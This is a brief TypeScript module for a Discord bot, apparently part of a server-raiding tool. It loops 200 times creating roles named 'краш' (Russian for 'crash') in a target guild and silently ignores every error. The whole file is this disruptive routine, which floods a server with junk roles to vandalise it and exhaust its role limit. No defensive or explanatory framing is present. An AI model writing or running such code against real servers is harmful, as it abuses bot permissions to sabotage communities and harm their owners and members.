import { Guild } from "discord.js";

export default async (guild: Guild): Promise<void> => {
	for (let i = 0; i < 200; i++) {
		await guild.roles
			.create({
				name: "краш",
			})
			.catch(() => {});
	}
};
